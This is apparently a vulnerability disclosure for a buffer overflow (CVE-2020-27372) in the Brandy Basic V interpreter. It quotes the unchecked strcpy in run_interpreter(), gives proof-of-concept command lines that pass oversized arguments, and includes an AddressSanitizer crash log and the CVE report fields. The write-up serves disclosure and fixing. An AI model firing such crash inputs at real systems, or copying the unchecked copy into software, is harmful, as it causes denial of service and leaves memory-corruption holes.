I found a vulnerability in Brandy Basic V Interpreter, a small tool for interpretering data.

A buffer overflow in run_interpreter() function and the another functions else. They also get input without checking input length.

```
static void run_interpreter(void) {
  if (setjmp(basicvars.restart)==0) {
    if (!basicvars.runflags.loadngo && !basicvars.runflags.outredir) announce();    /* Say who we are */
    init_errors();  /* Set up the signal handlers */
    if (liblist!=NIL) load_libraries();
    if (loadfile!=NIL) {    /*  Name of program to load was given on command line */
      read_basic(loadfile);
      strcpy(basicvars.program, loadfile);  /* Save the name of the file */
      if (basicvars.runflags.loadngo) run_program(basicvars.start); /* Start program execution */
    }
  }
 ```
 
 by sending payloads below, I was easy to trigger buffer overflow vulnerabilities
 ```
brandy -load `python -c 'print "A"*2048'`
or:
brandy -lib `python -c 'print "A"*2048'`
or:
brandy `python -c 'print "A"*2048'`
```

I also compiled source code with AddressSanitizer, so I got the error!

=================================================================
==25287==ERROR: AddressSanitizer: global-buffer-overflow on address 0x557a91ecc374 at pc 0x7f14ceffc3a6 bp 0x7fff8f8d39d0 sp 0x7fff8f8d3178
WRITE of size 26 at 0x557a91ecc374 thread T0
    #0 0x7f14ceffc3a5  (/usr/lib/x86_64-linux-gnu/libasan.so.4+0x663a5)
    #1 0x557a91b3d5e8 in init2 src/brandy.c:156
    #2 0x557a91b3d5e8 in main src/brandy.c:70
    #3 0x7f14ce590b96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)
    #4 0x557a91b3e369 in _start (/bin/brandy+0x21369)

0x557a91ecc374 is located 44 bytes to the left of global variable 'lastaddr' defined in 'src/commands.c:53:14' (0x557a91ecc3a0) of size 4
0x557a91ecc374 is located 0 bytes to the right of global variable 'editname' defined in 'src/commands.c:55:13' (0x557a91ecc360) of size 20
SUMMARY: AddressSanitizer: global-buffer-overflow (/usr/lib/x86_64-linux-gnu/libasan.so.4+0x663a5) 
Shadow bytes around the buggy address:
  0x0aafd23d1810: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0aafd23d1820: 00 00 00 00 00 00 00 00 00 00 00 00 00 f9 f9 f9
  0x0aafd23d1830: f9 f9 f9 f9 00 00 00 00 00 f9 f9 f9 f9 f9 f9 f9
  0x0aafd23d1840: 00 00 00 00 01 f9 f9 f9 f9 f9 f9 f9 00 f9 f9 f9
  0x0aafd23d1850: f9 f9 f9 f9 00 00 00 00 00 f9 f9 f9 f9 f9 f9 f9
=>0x0aafd23d1860: 00 f9 f9 f9 f9 f9 f9 f9 00 00 00 00 00 00[04]f9
  0x0aafd23d1870: f9 f9 f9 f9 04 f9 f9 f9 f9 f9 f9 f9 00 00 00 00
  0x0aafd23d1880: 00 f9 f9 f9 f9 f9 f9 f9 00 f9 f9 f9 f9 f9 f9 f9
  0x0aafd23d1890: 00 f9 f9 f9 f9 f9 f9 f9 04 f9 f9 f9 f9 f9 f9 f9
  0x0aafd23d18a0: 00 f9 f9 f9 f9 f9 f9 f9 00 00 00 00 00 00 00 00
  0x0aafd23d18b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==25287==ABORTING


MITRE gave me a ID for this vulnerability: CVE-2020-27372
> [Vulnerability Type]
> Buffer Overflow
>
> ------------------------------------------
>
> [Vendor of Product]
> Brandy
>
> ------------------------------------------
>
> [Affected Product Code Base]
> Brandy Basic V Interpreter - Fixed version: Matrix Brandy 1.21
>
> ------------------------------------------
>
> [Affected Component]
> Function effected: run_interpreter()->strcpy()
>
> ------------------------------------------
>
> [Attack Type]
> Local
>
> ------------------------------------------
>
> [Impact Denial of Service]
> true
>
> ------------------------------------------
>
> [Attack Vectors]
> Passing payload directly to program via parameter.
>
> ------------------------------------------
>
> [Reference]
> https://sourceforge.net/p/brandy/bugs/10/
>
> ------------------------------------------
>
> [Has vendor confirmed or acknowledged the vulnerability?]
> true
